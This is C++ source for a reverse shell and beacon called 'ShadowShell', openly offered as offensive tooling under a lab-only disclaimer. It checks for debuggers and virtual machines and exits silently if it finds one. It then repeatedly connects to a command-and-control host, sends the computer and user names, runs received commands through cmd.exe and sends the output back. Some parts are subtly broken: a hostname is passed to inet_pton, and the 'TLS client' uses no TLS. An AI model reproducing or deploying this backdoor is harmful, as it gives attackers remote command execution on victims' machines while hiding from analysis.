// ShadowShell.cpp - Advanced C++ Memory-Resident Reverse Shell & Beacon
// EPO - Lab / Explicit Permission ONLY! 💀

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>
#include <string>
#include <vector>
#include <random>
#include <chrono>
#include <thread>
#include <fstream>
#include <sstream>
#include <iomanip>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "crypt32.lib")

// ================= CONFIG =================
const std::string DEFAULT_C2 = "c2.yourdomain.com";
const int DEFAULT_PORT = 443;
const int SLEEP_MIN = 15;
const int SLEEP_MAX = 90;
const double JITTER = 0.6;

// ================= ANTI-ANALYSIS =================
bool IsDebuggerPresentCheck() {
    return ::IsDebuggerPresent();
}

bool IsVM() {
    // Simple CPUID check for VMware/VirtualBox
    int cpuInfo[4] = {0};
    __cpuid(cpuInfo, 1);
    return (cpuInfo[2] & (1 << 31)) != 0; // Hypervisor bit
}

void SleepObfuscated(int seconds) {
    LARGE_INTEGER liDueTime;
    liDueTime.QuadPart = - (LONGLONG)seconds * 10000000LL; // Negative = relative

    HANDLE hTimer = CreateWaitableTimer(NULL, TRUE, NULL);
    if (hTimer) {
        SetWaitableTimer(hTimer, &liDueTime, 0, NULL, NULL, FALSE);
        WaitForSingleObject(hTimer, INFINITE);
        CloseHandle(hTimer);
    } else {
        Sleep(seconds * 1000);
    }
}

// ================= TLS CLIENT =================
bool ConnectToC2(const std::string& host, int port, SOCKET& sock) {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2,2), &wsaData);

    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) return false;

    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, host.c_str(), &addr.sin_addr);

    return connect(sock, (sockaddr*)&addr, sizeof(addr)) == 0;
}

// ================= MAIN BEACON LOOP =================
int main(int argc, char* argv[]) {
    if (IsDebuggerPresentCheck() || IsVM()) {
        return 0; // Silent exit in analysis env
    }

    std::string c2_host = (argc > 1) ? argv[1] : DEFAULT_C2;
    int c2_port = (argc > 2) ? atoi(argv[2]) : DEFAULT_PORT;

    while (true) {
        SOCKET sock;
        if (!ConnectToC2(c2_host, c2_port, sock)) {
            SleepObfuscated(random() % (SLEEP_MAX - SLEEP_MIN) + SLEEP_MIN);
            continue;
        }

        // Send beacon ident
        std::string ident = "HOST:" + std::string(getenv("COMPUTERNAME")) + "|USER:" + std::string(getenv("USERNAME"));
        send(sock, ident.c_str(), ident.length(), 0);

        char buffer[4096];
        int bytes = recv(sock, buffer, sizeof(buffer) - 1, 0);
        if (bytes > 0) {
            buffer[bytes] = '\0';
            std::string cmd(buffer);

            // Execute command via cmd.exe
            std::string exec_cmd = "cmd /c " + cmd + " > temp.txt 2>&1";
            system(exec_cmd.c_str());

            // Read output
            std::ifstream file("temp.txt");
            std::stringstream ss;
            ss << file.rdbuf();
            std::string output = ss.str();
            file.close();
            remove("temp.txt");

            send(sock, output.c_str(), output.length(), 0);
        }

        closesocket(sock);
        SleepObfuscated(random() % (SLEEP_MAX - SLEEP_MIN) + SLEEP_MIN);
    }

    WSACleanup();
    return 0;
}